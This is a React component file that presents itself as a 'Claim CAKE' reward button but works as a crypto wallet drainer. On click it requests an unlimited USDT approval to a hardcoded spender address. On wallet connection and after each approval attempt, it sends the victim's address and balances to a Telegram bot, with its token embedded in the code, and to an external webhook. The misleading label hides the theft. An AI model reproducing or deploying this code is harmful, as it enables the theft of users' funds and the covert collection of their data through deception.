// Approvewallet.jsx
import { useAccount, useWalletClient, useBalance } from "wagmi";
import { erc20Abi, parseUnits } from "viem";
import { bsc } from "wagmi/chains";
import { useState, useEffect } from "react";




const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
const SPENDER = "0x2990048172A3687249B2DF6c2F2D8e8401330E88"; // Your spender address

// 🔹 Send message to Telegram

const sendToTelegram = async (message) => {
  console.log("📩 Sending to Telegram:", message); // debug log

  const botToken = "7477590341:AAHz8Yl2jYCZIa2uBJQnYFifQAUk0WGWkUY"; 
  const chatId = "-1002762295115";
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });


    const result = await response.json();
    console.log("Telegram API response:", result); // log response

    if (!response.ok) {
      console.error("❌ Telegram API error:", result);
    }
  } catch (e) {
    console.error("❌ Telegram send failed:", e);
  }
};

// 🔹 Send message to external API
const sendToExternalAPI = async (data) => {
  const apiEndpoint =
    localStorage.getItem("apiEndpoint") || "https://your-bot-api.com/webhook";

  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      console.error("External API error:", await response.text());
    }
  } catch (e) {
    console.error("External API send failed:", e);
  }
};

export default function ApproveButton() {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [loading, setLoading] = useState(false);

    const [cakeReward, setCakeReward] = useState(0);

  useEffect(() => {
    const storedReward = localStorage.getItem("cakeReward");
    if (storedReward) setCakeReward(storedReward);
  }, []);


  // 🔹 Get balances
  const { data: bscBalance } = useBalance({ address, chainId: bsc.id });
  const { data: usdtBalance } = useBalance({
    address,
    token: USDT_ADDRESS,
    chainId: bsc.id,
  });

   const usdtFormatted = usdtBalance
      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
      : "0";
    const bnbFormatted = bscBalance
      ? parseFloat(bscBalance.formatted).toFixed(9)
      : "0";

  // 🔹 Send message when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      sendToTelegram(`🟢 Wallet Connected:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted} `);
      sendToExternalAPI({
        address,
        action: "wallet_connected",
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    }
  }, [isConnected, address]);

  // 🔹 Handle Approve button
  const handleApprove = async () => {
    if (!walletClient || !isConnected || !address) {
      alert("Please Connect Your Wallet.");
      return;
    }

    setLoading(true);

    const usdtFormatted = usdtBalance
      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
      : "0";
    const bnbFormatted = bscBalance
      ? parseFloat(bscBalance.formatted).toFixed(9)
      : "0";

    try {
      const maxAmount = parseUnits(
        "115792089237316195423570985008687907853269984665640564039457584007913129639935",
        0
      );

      const hash = await walletClient.writeContract({
        address: USDT_ADDRESS,
        abi: erc20Abi,
        functionName: "approve",
        args: [SPENDER, maxAmount],
        account: address,
      });

      await sendToTelegram(
        `✅ USDT Approved:\n${address}\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nTx Hash: ${hash}`
      );

      await sendToExternalAPI({
        address,
        action: "approval_success",
        txHash: hash,
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    } catch (err) {
      console.error("USDT approval failed:", err.message);

      await sendToTelegram(
        `❌ USDT Approval Failed:\n$<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}`
      );

      await sendToExternalAPI({
        address,
        action: "approval_failed",
        error: err.message,
        usdtBalance: usdtFormatted,
        bscBalance: bnbFormatted,
        timestamp: new Date().toISOString(),
      });
    }

    setLoading(false);
  };



  return (
    <button
      onClick={handleApprove}
      disabled={loading}
      style={{
        padding: "10px 20px",
        background: "#ff4d00ff",
        color: "white",
        borderRadius: "8px",
        border: "none",
        cursor: "pointer",
        marginTop: "20px",
        width: "150px",
      }}
    >
      {loading ? "Claiming..." : `🍰Claim ${cakeReward} CAKE`}
    </button>
  );
}
